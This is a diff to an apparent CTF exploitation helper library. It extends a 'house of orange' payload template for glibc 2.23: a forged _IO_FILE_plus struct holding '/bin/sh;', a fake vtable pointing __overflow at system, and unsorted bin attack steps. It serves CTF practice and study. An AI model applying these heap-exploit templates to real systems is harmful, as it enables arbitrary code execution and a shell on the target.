@@ -4,7 +4,7 @@ import json
 import shutil
 import pwn
 
-def get_offsets(path_to_libc):
+def get_offsets(path_to_libc=""):
     '''
     test under libc 2.23
     get offsets of members in struct _IO_FILE_plus and struct _IO_jump_t (the type of vtable)
@@ -18,7 +18,7 @@ def get_offsets(path_to_libc):
     if os.path.exists(LOCAL_FILE):
         try:
             local = json.load(open(LOCAL_FILE, "r"))
-            if local['path'] == path_to_libc:
+            if path_to_libc == "" or local['path'] == path_to_libc:
                 return local
             print("exists local file corresponding to "+local['path'])
             if raw_input("remove local file y/n ? ").lower() == 'y':
@@ -129,21 +129,40 @@ def house_of_orange():
     call trace:
         malloc_printerr => __libc_message => abort => fflush / _IO_flush_all_lockp => _IO_OVERFLOW
 
+    examples:
+        huwangbei_2019_flower, hctf_2018_heapstorm_zero, twctf_2017_parrot
+
     return:
         simple payload template
     '''
     payload='''
+# need to leak heap and libc addr first
+
+# then construct _IO_FILE_plus and vtable struct on heap
+# finally use unsorted bin attack to make _IO_list_all points
+# to unsorted bin and the _chain(0x60 small bin) points to 
+# our _IO_FILE_plus struct
+
 offsets = pf.iofile.get_offsets(path_to_libc)
+p1 = p64(0)+p64(SOME_SIZE)+p64(libc.symbols['_IO_list_all']-0x10)*2
 fake_file = fit({
     0:"/bin/sh;"
-    offsets['file']['_mode']:0,
+    8:0x61,
+    0x18: p32/p64(addr_of_p1),
     offsets['file']['_IO_write_ptr']:2,
     offsets['file']['_IO_write_base']:1,
+    offsets['file']['_mode']:0,
     offsets['vtable_addr']:p32/p64(fake_vtable_addr)
 })
 fake_vtable = fit({
     offsets['vtable']['__overflow']:p32/p64(system_addr/shellcode),
 })
+
+# then use unsorted bin attack, make a victim's bk points to fake_file
+# then malloc SOME_SIZE, then the fake_file will be put into 0x60 small bin
+# and _IO_list_all will point to unsorted bin
+# p.s. if treat unsorted bin as the start of a _IO_FIlE_plus struct, then the 0x60 
+# small bin is the `_chain` member's address, which point's to our fake_file
 '''
     return payload
 
@@ -177,5 +196,5 @@ fake_fd = p64(std_out_base + offsets['file']['_IO_write_ptr'])[:2]
 # then get shell
 
 # note that 4-bit brute-force is needed
-    '''
+'''
     return payload
